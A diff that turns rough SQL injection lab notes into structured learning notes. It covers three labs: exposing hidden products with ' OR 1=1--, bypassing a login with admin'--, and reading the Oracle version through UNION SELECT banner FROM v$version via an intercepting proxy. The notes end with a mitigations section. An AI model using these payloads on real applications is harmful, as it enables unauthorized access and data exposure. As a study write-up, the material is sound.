@@ -1,27 +1,198 @@
-## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data:
+# SQL Injection (SQLi) – Learning Notes
 
-General query to retrieve items in an e-com:
-SELECT * FROM Products WHERE category= 'Gifts' AND released = 1
-- We can retreive hidden data from the database by commenting out the relased condition of the query in the search bar or any entry point.
-- There are two ways to acheive this
-- We can use a simple '-- (comment)
-- Also, we can use 'OR1=1 Since 1=1 is true in all cases it retrieves all the information.
+## 1. SQL Injection in WHERE Clause – Retrieving Hidden Data
 
-## SQLi vulnerability in login bypass
+### Vulnerability Description
 
-General query in login where username and password is admin:
-SELECT * FROM users WHERE username='admin' AND password='admin'
-- We can bypass the login by commenting out the password part of the query.
-- Search bar is generally not the entry point for logins. Therefore, we use the command in the Username textbox.
-Ex: Username : admin'--
-- The limitation here is we must know the username
+The application dynamically builds SQL queries using user-supplied input without proper validation or parameterized queries. This allows modification of the SQL logic in the `WHERE` clause.
 
-## SQLi querying DB type and version of Oracle
+### Original Query
 
-- We were told that there was a vulnerability in the Category section.
-- I used mitmproxy to proxy the query since it was not available via the searchbar.
-- First, I determined the number of colums in the DB.
-- Later, in mitm we edited the query by referring the Cheatsheat since we already knew it was Oracle.
-- Note: if the command does not solve the lab we should interchange the column names.
-- mitmproxy alternatives: Burpsuite, Zap 
+```sql
+SELECT * FROM Products
+WHERE category = 'Gifts' AND released = 1;
+```
 
+- `released = 1` ensures only public products are shown.
+
+### Injection Point
+
+The `category` parameter (search bar or category filter).
+
+### Payloads Used
+
+**Method 1: SQL Comment Injection**
+```sql
+'--
+```
+
+**Method 2: Boolean-Based Injection**
+```sql
+' OR 1=1--
+```
+
+### Resulting Query (Example)
+
+```sql
+SELECT * FROM Products
+WHERE category = '' OR 1=1--' AND released = 1;
+```
+
+### Why This Works
+
+1. `'` closes the original string literal
+2. `OR 1=1` always evaluates to `TRUE`
+3. `--` comments out the remainder of the query
+4. The `released = 1` condition is ignored
+
+### Impact
+
+- Hidden or unreleased products are exposed
+- Business logic is bypassed
+
+---
+
+## 2. SQL Injection in Login Functionality – Authentication Bypass
+
+### Vulnerability Description
+
+The login functionality concatenates user input directly into SQL queries, allowing attackers to bypass authentication.
+
+### Original Query
+
+```sql
+SELECT * FROM users
+WHERE username = 'admin' AND password = 'admin';
+```
+
+### Injection Point
+
+The `username` field (login forms usually do not use search bars).
+
+### Payload Used
+
+```sql
+admin'--
+```
+
+### Resulting Query
+
+```sql
+SELECT * FROM users
+WHERE username = 'admin'--' AND password = 'admin';
+```
+
+### Why This Works
+
+1. `'` closes the username string
+2. `--` comments out the password condition
+3. Authentication succeeds if the username exists
+
+### Limitations
+
+- A valid username must be known or guessed
+- Does not work well if usernames are unpredictable
+
+---
+
+## 3. SQL Injection – Identifying Oracle Database Type and Version
+
+A SQL injection vulnerability exists in the `Category` parameter, but it is not directly accessible through the UI.
+
+### Tools Used
+
+- **mitmproxy** to intercept and modify HTTP requests
+- **Alternatives:** Burp Suite, OWASP ZAP
+
+### Step 1: Intercept the Request
+
+- Used a proxy tool to capture the request containing the `category` parameter
+- Modified the request directly in the proxy
+
+### Step 2: Determine the Number of Columns
+
+Used `ORDER BY` to identify the column count:
+
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+```
+
+The highest number that does not cause an error indicates the number of columns.
+
+### Step 3: Confirm UNION Injection
+
+```sql
+' UNION SELECT NULL, NULL, NULL FROM dual--
+```
+
+- `dual` is an Oracle-specific table
+- Matching the correct number of columns is required
+
+### Step 4: Identify Database Version (Oracle)
+
+```sql
+' UNION SELECT banner, NULL, NULL FROM v$version--
+```
+
+If column positions differ, swap the column placement:
+
+```sql
+' UNION SELECT NULL, banner, NULL FROM v$version--
+```
+
+### Why This Works
+
+- Oracle exposes database metadata through `v$version`
+- UNION-based SQLi allows retrieval of database information
+
+---
+
+## Key Takeaways
+
+- SQL injection occurs when user input is directly concatenated into SQL queries
+- Commenting (`--`) and boolean logic (`OR 1=1`) can alter query behavior
+- UNION-based SQLi requires matching column count and data types
+- Proxy tools are essential when injection points are not visible in the UI
+
+---
+
+## Mitigations
+
+### Recommended Security Practices
+
+1. **Use Prepared Statements / Parameterized Queries**
+   - The most effective defense against SQL injection
+   - Separates SQL code from user data
+
+2. **Avoid Dynamic SQL String Concatenation**
+   - Never build queries by concatenating strings with user input
+
+3. **Implement Input Validation**
+   - Whitelist acceptable input patterns
+   - Sanitize and validate all user-supplied data
+
+4. **Use Least-Privilege Database Access**
+   - Database accounts should have minimal necessary permissions
+   - Separate accounts for different application functions
+
+5. **Use ORMs (Object-Relational Mapping) Where Possible**
+   - ORMs often provide built-in protections against SQL injection
+
+6. **Web Application Firewalls (WAF)**
+   - Can detect and block common SQL injection attempts
+
+---
+
+## Summary
+
+This exercise demonstrates how SQL injection can:
+
+- ✅ Expose hidden data
+- ✅ Bypass authentication mechanisms
+- ✅ Reveal database type and version information
+
+**Warning:** These techniques should only be used for authorized security testing and educational purposes. Unauthorized access to computer systems is illegal.
+
+---
